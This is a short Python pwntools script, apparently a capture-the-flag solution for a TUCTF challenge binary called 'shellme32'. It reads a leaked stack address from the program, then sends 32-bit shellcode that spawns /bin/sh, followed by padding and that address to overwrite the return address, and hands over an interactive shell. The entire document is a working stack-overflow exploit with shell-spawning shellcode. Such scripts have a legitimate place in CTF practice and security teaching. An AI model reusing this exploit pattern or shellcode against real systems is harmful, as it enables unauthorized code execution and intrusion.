from pwn import *


shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xb0\x0b\xcd\x80"
#p=remote("chal.tuctf.com",30506)
p=process("./shellme32")
a=p.recv()[36:-3]
print a
adr= int(a[2:],16)

payload=""
payload+=shellcode
payload+="A"*17
payload+=p32(adr)

pause()
p.sendline(payload)
p.interactive()
